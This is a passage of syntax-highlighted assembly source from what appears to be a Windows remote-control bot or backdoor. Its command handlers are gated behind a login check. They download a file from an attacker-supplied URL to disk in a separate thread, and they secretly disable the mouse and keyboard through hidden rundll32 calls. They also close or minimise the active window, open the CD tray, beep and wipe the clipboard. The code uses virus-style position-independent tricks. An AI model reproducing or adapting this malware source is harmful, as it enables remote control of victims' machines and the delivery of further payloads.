            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            
</span><span class="sc5">__spc</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__skip</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">__skip</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CR</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__spc</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_cmd_syntax</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchspc</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">516</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">__copy</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__copy</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchcr</span><span class="sc0">
            
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__err</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; thread param</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bot_download_thread</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2000h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CreateThread</span><span class="sc0">
            
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
            
</span><span class="sc5">__err</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc5">bot_download_thread</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">
            
            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">url</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
            
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">f_handle</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">inet_handle</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">inet_rsrc</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">h_mem</span><span class="sc0">
            
            </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">__dl_thread_xception</span><span class="sc4">&gt;</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">downdlta</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">_DT</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">downdlta</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]&gt;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">url</span><span class="sc0">
            </span><span class="sc5">@endsz</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">f_handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">my</span><span class="sc0"> </span><span class="sc5">cute</span><span class="sc0"> </span><span class="sc5">GodzIIla</span><span class="sc0"> </span><span class="sc5">rox</span><span class="sc4">~&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">INTERNET_OPEN_TYPE_DIRECT</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_InternetOpenA</span><span class="sc0"> </span><span class="sc5">_DT</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__err</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">inet_handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">url</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">inet_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_InternetOpenUrlA</span><span class="sc0"> </span><span class="sc5">_DT</span><span class="sc0">
            
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err_1</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">inet_rsrc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64000</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">h_mem</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">inet_rsrc</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_InternetQueryDataAvailable</span><span class="sc0"> </span><span class="sc5">_DT</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err_2</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64000</span><span class="sc0">
            </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">__read</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64000</span><span class="sc0">

</span><span class="sc5">__read</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">h_mem</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">inet_rsrc</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_InternetReadFile</span><span class="sc0"> </span><span class="sc5">_DT</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err_2</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err_2</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">h_mem</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">f_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteFile</span><span class="sc0"> </span><span class="sc5">_DT</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc5">jecxnz</span><span class="sc0">  </span><span class="sc5">__cycle</span><span class="sc0">
            
</span><span class="sc5">__err_2</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">h_mem</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">free</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">inet_rsrc</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_InternetCloseHandle</span><span class="sc0"> </span><span class="sc5">_DT</span><span class="sc0">                
            
</span><span class="sc5">__err_1</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">inet_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_InternetCloseHandle</span><span class="sc0"> </span><span class="sc5">_DT</span><span class="sc0">
</span><span class="sc5">__err</span><span class="sc4">:</span><span class="sc0">          
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">f_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc5">_DT</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">url</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">free</span><span class="sc0">
            
            </span><span class="sc6">leave</span><span class="sc0">
</span><span class="sc5">__dl_thread_xception</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ExitThread</span><span class="sc0"> </span><span class="sc5">_DT</span><span class="sc0">
            
</span><span class="sc5">bot_download_thread</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">            

</span><span class="sc5">bot_cmd_killmouse</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">rundll32.exe</span><span class="sc0"> </span><span class="sc5">mouse</span><span class="sc4">,</span><span class="sc5">disable</span><span class="sc4">~&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SW_HIDE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">WinExec</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">


</span><span class="sc5">bot_cmd_killkeyb</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">rundll32.exe</span><span class="sc0"> </span><span class="sc5">keyboard</span><span class="sc4">,</span><span class="sc5">disable</span><span class="sc4">~&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SW_HIDE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">WinExec</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc5">bot_cmd_syskill</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">
    
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">rundll32.exe</span><span class="sc0"> </span><span class="sc5">user</span><span class="sc4">,</span><span class="sc5">disableoemlayer</span><span class="sc4">~&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SW_HIDE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">WinExec</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc5">bot_cmd_minaw</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">GetForegroundWindow</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">IsIconic</span><span class="sc0">
    
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__minimyzed</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CloseWindow</span><span class="sc0">

</span><span class="sc5">__minimyzed</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc5">bot_cmd_closecd</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">set</span><span class="sc0"> </span><span class="sc5">CDAudio</span><span class="sc0"> </span><span class="sc5">door</span><span class="sc0"> </span><span class="sc5">closed</span><span class="sc4">~&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">mciSendStringA</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc5">bot_cmd_opencd</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">set</span><span class="sc0"> </span><span class="sc5">CDAudio</span><span class="sc0"> </span><span class="sc5">door</span><span class="sc0"> </span><span class="sc5">open</span><span class="sc4">~&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">mciSendStringA</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
            
            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc5">bot_cmd_closeaw</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">GetForegroundWindow</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">WM_QUIT</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">PostMessageA</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc5">bot_cmd_beep</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">
    
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LF</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchcr</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ascii2num</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__end</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">MessageBeep</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__1</span><span class="sc0">

</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">bot_cmd_cleanclip</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">GetOpenClipboardWindow</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">OpenClipboard</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">EmptyClipboard</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CloseClipboard</span><span class="sc0">
            
            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
